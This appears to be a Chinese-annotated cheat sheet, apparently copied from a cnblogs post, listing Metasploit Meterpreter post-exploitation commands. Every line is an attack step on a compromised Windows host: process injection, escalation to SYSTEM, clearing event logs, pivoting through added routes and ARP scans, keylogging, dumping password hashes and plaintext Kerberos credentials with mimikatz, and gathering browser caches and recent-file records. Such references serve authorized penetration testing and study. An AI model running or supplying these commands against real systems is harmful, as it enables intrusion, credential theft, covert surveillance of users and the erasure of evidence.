https://www.cnblogs.com/backlion/p/9484949.html
```
migrate pid         #进程注入
getprivs            #尽可能获取尽可能多的特权
getuid              #获得当前的权限
getsystem           #通过各种攻击向量将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户
getsystem –h        #升级权限SYSTEM账户
background          #返回，把meterpreter后台挂起
sessions -i number  # 与会话进行交互
route               #查看或修改受害者路由表
clearev             #清除日志
run autoroute -s 10.1.1.6/255.0.0.0 #添加路由表
run arp_scanner -r 10.1.1.1/24 # 扫描存活主机

keyscan_start       #开启键盘记录功能
keyscan_dump        #显示捕捉到的键盘记录信息
keyscan_stop        #停止键盘记录功能

#获取密码
load mimikatz       #加载mimikatz
msv                 #获取hash值
kerberos            #获取明文

#获取敏感文件
run post/windows/gather/checkvm           #是否虚拟机
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks         #获取最近的文件操作
run post/windows/gather/enum_ie           #获取IE缓存
run post/windows/gather/enum_chrome       #获取Chrome缓存
```

